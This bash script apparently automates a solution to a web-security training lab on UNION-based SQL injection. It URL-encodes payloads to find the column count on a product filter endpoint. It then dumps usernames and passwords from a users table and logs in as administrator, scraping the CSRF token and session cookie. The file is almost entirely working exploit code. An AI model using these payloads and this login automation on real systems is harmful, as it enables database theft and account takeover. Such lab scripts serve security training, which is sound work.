#!/bin/bash

source ../common.hook

PAYLOAD=$(url_encode "/filter?category=Pets' UNION SELECT NULL-- ")

for i in {1..10}; do
    output "Trying ${PAYLOAD}" INFO
    curl "${PS_URL}${PAYLOAD}" | grep "Internal Server Error" 1>/dev/null
    if [ $(echo $?) -ne 0 ]; then
        output "Number of columns: ${i}" INFO; NUM_COLS=$i; break;
    fi

    PAYLOAD=$(url_encode "${PAYLOAD%--+},NULL-- ")
done

PAYLOAD=$(url_encode "/filter?category=Pets' UNION SELECT NULL,CONCAT(username,' ',password) FROM users--")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"

USERNAME='administrator'
PASSWORD='wf7mjwd9ykjlgx4euso4'
output "Password found: $PASSWORD" SUCCESS

REQUEST=$(curl -c - "${PS_URL}/login")
CSRF=$(echo ${REQUEST} | sed -n "s/.*value=\"\(\S*\)\">.*/\1/p")
COOKIE=$(echo ${REQUEST} | sed -n "s/.*session\s\(\S*\)$/\1/p")

output "Trying POST on ${PS_URL}/login with -H (${COOKIE}) -d (${CSRF}|${USERNAME}|${PASSWORD})" INFO
curl "${PS_URL}/login" -H "Cookie: session=${COOKIE}" -d "csrf=${CSRF}&username=${USERNAME}&password=${PASSWORD}" -X POST

eval_result $PS_URL
